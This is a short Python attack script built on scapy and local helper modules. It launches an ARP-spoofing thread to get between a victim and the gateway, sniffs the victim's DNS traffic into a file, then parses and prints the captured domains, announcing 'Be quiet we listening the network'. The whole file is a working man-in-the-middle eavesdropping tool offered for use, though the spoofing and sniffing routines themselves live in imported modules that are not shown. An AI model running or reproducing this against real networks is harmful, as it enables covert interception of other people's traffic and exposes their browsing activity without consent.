#!/usr/bin/python

from scapy.all import *
from utils.network import *
from utils.tools import *
import socket, struct
import argparse
import sys
from threading import *
thread_list = []
address = preset_arp_spoofing(True)
th_spoofer = Spoofer(address[0], address[1], address[2], address[3])
th_spoofer.start()

th_sniffer= Sniffer(address[3],"dns","./result/scanNetwork/dns_http_sniffed")
thread_list.append(th_sniffer)
print(colors.CLEAR+colors.OKBLUE+colors.BOLD+"Be quiet we listening the network"+colors.ENDC)
th_sniffer.start()

th_sniffer.join()
th_spoofer.stop()

print(colors.CLEAR)
dns_get_parser("./result/scanNetwork/dns_http_sniffed","./result/scanNetwork/dns_http_sniffed_proper.txt")
print_file("./result/scanNetwork/dns_http_sniffed_proper.txt",4)
